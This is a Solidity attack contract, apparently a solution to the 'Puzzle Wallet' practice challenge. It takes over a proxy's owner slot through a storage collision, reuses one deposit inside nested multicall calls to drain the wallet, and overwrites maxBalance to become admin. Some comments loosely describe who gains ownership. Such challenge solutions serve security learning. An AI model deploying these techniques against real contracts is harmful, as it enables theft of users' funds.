// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/PuzzleWallet.sol";
import "hardhat/console.sol";

contract PuzzleWalletAttacher {
    address payable public target;

    constructor(address payable _target) {
        target = _target;
    }

    function attack() public payable returns (bool) {
        address attacker = msg.sender;

        PuzzleProxy proxy = PuzzleProxy(target);
        PuzzleWallet wallet = PuzzleWallet(target);
        // 1 - call proxy proposeNewAdmin, now the owner has been exploited and the attacker is the owner
        proxy.proposeNewAdmin(address(this));
        // 2 - whitelist the attacker to be able to call setMaxBalance and execute, deposit and other functions
        wallet.addToWhitelist(address(this));

        // 3 - exploit the execute function to call setMaxBalance this make the contract balance to be 0

        bytes[] memory dataArray = new bytes[](4);
        // spend 1000000000000000 wei with deposit
        dataArray[0] = abi.encodeWithSignature("deposit()");
        // spend 1000000000000000 wei with execute sent to the attacker
        dataArray[1] = abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 1000000000000000, "");

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("execute(address,uint256,bytes)", attacker, 1000000000000000, "");

        // spend the rest of the balance with multicall calling deposit and execute twice
        // bypassing the deposit limit
        dataArray[2] = abi.encodeWithSignature("multicall(bytes[])", data);
        dataArray[3] = abi.encodeWithSignature("multicall(bytes[])", data);

        // whitelist the contract to be able to call execute
        wallet.addToWhitelist(target);

        // deposit 1000000000000000 wei to the wallet to be able to execute
        wallet.deposit{value: 1000000000000000}();

        // call multicall with  datacall to execute
        wallet.execute{value: 1000000000000000}(
            target,
            1000000000000000,
            abi.encodeWithSignature("multicall(bytes[])", dataArray)
        );

        // 4 - call setMaxBalance, the value is the attacker wallet casted to uint256
        wallet.setMaxBalance(uint256(uint160(attacker)));

        return proxy.admin() == attacker;
    }
}
